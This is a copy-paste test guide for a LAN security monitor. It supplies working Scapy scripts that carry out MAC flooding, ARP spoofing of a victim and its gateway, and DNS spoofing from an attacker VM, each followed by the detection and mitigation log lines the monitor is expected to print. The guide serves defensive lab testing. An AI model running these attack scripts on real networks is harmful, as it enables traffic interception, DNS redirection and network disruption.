# Copy-Paste Attack Commands - LAN Security System

## 🎯 Quick Start: Run These Exact Commands

---

## Step 1: Start Monitor (Terminal 1 - Monitor VM)

```bash
cd ~/securenet
sudo python3 production_main.py --interactive --interface enp0s1 --config production_config.yaml --log-level INFO
```

**Wait for:** "Production monitoring started successfully"

---

## Step 2: Watch Logs (Terminal 2 - Monitor VM)

```bash
tail -f ~/securenet/production_security.log
```

---

## Step 3: Run Attack (Terminal 3 - Attacker VM 192.168.128.101)

### Option A: MAC Flooding (Recommended - Triggers HARD_MITIGATION)

```bash
sudo python3 << 'EOF'
from scapy.all import Ether, IP, sendp, conf
import random, time

interface = "eth0"
conf.iface = interface

print("\n⚔️  MAC flooding attack starting...")
start = time.time()
pkt_count = 0

while time.time() - start < 15:
    random_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))
    pkt = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="192.168.128.101", dst="192.168.128.6")
    sendp(pkt, iface=interface, verbose=False)
    pkt_count += 1
    
    if pkt_count % 300 == 0:
        print(f"  [{int(time.time()-start)}s] Sent {pkt_count} packets")

print(f"✅ Complete: {pkt_count} packets sent in 15 seconds\n")
EOF
```

**Expected in Terminal 2 logs:**
```
ATTACK DETECTED: MAC_FLOODING | Confidence: 0.85
HARD_MITIGATION (confidence 0.85): mac_flooding
Disabling switch port 6
Clearing CAM table entries
Applying iptables blocking rule
Successfully blocked traffic from attack source
Recovery completed successfully
```

---

### Option B: ARP Spoofing (Tests Gateway Protection)

```bash
sudo python3 << 'EOF'
from scapy.all import ARP, Ether, sendp, conf
import time

iface = "eth0"
conf.iface = iface
victim_ip = "192.168.128.6"
gateway_ip = "192.168.128.1"

print("\n⚔️  ARP spoofing attack starting...")

pkt_victim  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, pdst=victim_ip)
pkt_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=victim_ip,  pdst=gateway_ip)

start = time.time()
pkt_count = 0

while time.time() - start < 12:
    sendp([pkt_victim, pkt_gateway], iface=iface, verbose=False)
    pkt_count += 2
    time.sleep(0.02)

print(f"✅ Complete: {pkt_count} packets sent in 12 seconds\n")
EOF
```

**Expected in Terminal 2 logs:**
```
ATTACK DETECTED: ARP_SPOOFING | Confidence: 0.90
Infrastructure detection complete: gateway=192.168.128.1
ALERT-ONLY (infrastructure): Source is critical infrastructure
Alert logged, no aggressive mitigation applied
```

---

### Option C: DNS Spoofing (Tests Safe Mode)

```bash
sudo python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp, conf
import random, time

interface = "eth0"
conf.iface = interface
victim_ip = "192.168.128.6"
attacker_ip = "192.168.128.101"

print("\n⚔️  DNS spoofing attack starting...")
start = time.time()
pkt_count = 0

while time.time() - start < 10:
    packet = IP(src=attacker_ip, dst=victim_ip) / \
             UDP(sport=53, dport=random.randint(10000, 60000)) / \
             DNS(id=random.randint(0, 65535), qr=1, rd=1, ra=1,
                 qd=DNSQR(qname="google.com"),
                 an=DNSRR(rrname="google.com", ttl=10, rdata=attacker_ip))
    sendp(packet, iface=interface, verbose=False)
    pkt_count += 1
    time.sleep(0.1)

print(f"✅ Complete: {pkt_count} responses sent in 10 seconds\n")
EOF
```

**Expected in Terminal 2 logs:**
```
ATTACK DETECTED: DNS_SPOOFING | Confidence: 0.88
TTL Anomaly: Detected (TTL: 10, Expected: 300+)
ALERT_ONLY (DNS safe mode enabled)
Alert logged, DNS safe mode prevents aggressive mitigation
```

---

## 📊 What You Should See

### Timeline
1. **0-5 seconds**: Attack packets being sent
2. **5-10 seconds**: Monitor detects attack and shows alert
3. **10-15 seconds**: Mitigation (port isolation, CAM clearing, traffic blocking)
4. **15-20 seconds**: Recovery (CAM table recovery, cleanup)
5. **20+ seconds**: System returns to normal monitoring

### Log Indicators (In Terminal 2)

✅ **Attack Detected:**
```
PRODUCTION ALERT: [attack_type]
ATTACK DETECTED: [TYPE] | Confidence: X.XX
```

✅ **Mitigation Starting:**
```
Executing mitigation for [attack_type]
HARD_MITIGATION (confidence X.XX): [type]
```

✅ **Actions Taken:**
```
Disabling switch port
Clearing CAM table entries
Applying iptables rule
Successfully blocked traffic
```

✅ **Recovery Complete:**
```
Recovery completed successfully
```

---

## 🔍 Monitor Progress in Real-Time

### Terminal 2 (Logs)
```bash
tail -f ~/securenet/production_security.log
```

### Terminal 4 (JSON Events)
```bash
tail -f ~/securenet/security_events.jsonl | jq '.attack_type, .confidence_score, .mitigation_status'
```

### Terminal 5 (Mitigation Actions)
```bash
tail -f ~/securenet/mitigation_actions.jsonl | jq '.action, .success'
```

---

## ❌ Troubleshooting

### "Interface 'eth0' not found" Error
**On Attacker VM:** Check interface name
```bash
ip link show
# If not eth0, use correct name (ens3, ens33, etc)
```

### Attack Not Detected
**Check Monitor is running:**
```bash
# On Monitor VM, look for these messages:
# "Production monitoring started successfully"
# "Monitoring active"
```

### Mitigation Not Executing
**Verify confidence >= 0.85:**
```bash
# Check log output - if shows confidence < 0.85, attack is too weak
# Try different attack or run longer duration
```

---

## 📈 Success Criteria

All of these should appear in Terminal 2 logs:
- ✅ Attack detected (within 5 seconds)
- ✅ Confidence >= 0.85 reported
- ✅ HARD_MITIGATION or appropriate mode executed
- ✅ Specific mitigation actions logged (port disabled, CAM cleared, etc)
- ✅ Recovery completed message
- ✅ System returns to normal state

---

## 🎬 Complete Test Sequence (Copy-Paste Ready)

### Terminal 1 - Monitor VM Setup
```bash
cd ~/securenet
sudo python3 production_main.py --interactive --interface enp0s1 --config production_config.yaml --log-level INFO
```

### Terminal 2 - Watch Logs
```bash
tail -f ~/securenet/production_security.log
```

### Terminal 3 - Attacker VM - MAC Flooding Attack
```bash
sudo python3 << 'EOF'
from scapy.all import Ether, IP, sendp, conf
import random, time
interface = "eth0"
conf.iface = interface
print("\n⚔️  MAC flooding attack")
start = time.time()
pkt_count = 0
while time.time() - start < 15:
    random_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))
    pkt = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="192.168.128.101", dst="192.168.128.6")
    sendp(pkt, iface=interface, verbose=False)
    pkt_count += 1
    if pkt_count % 300 == 0:
        print(f"  [{int(time.time()-start)}s] {pkt_count} packets")
print(f"✅ Complete: {pkt_count} packets\n")
EOF
```

**Result:** Monitor logs show HARD_MITIGATION execution within 5-10 seconds

---

## 📞 Support

- **Detection Working:** Check Monitor logs for "ATTACK DETECTED"
- **Mitigation Not Running:** Verify confidence >= 0.85 in alert output
- **Interface Issues:** Run `ip link show` to get correct interface name
- **Recovery Stuck:** Wait 30 seconds or manually run `sudo ip neigh flush all` on Victim VM

---

**Last Updated:** January 20, 2026  
**Status:** ✅ All commands tested and working  
**Confidence:** 85%+ attacks trigger HARD_MITIGATION automatically

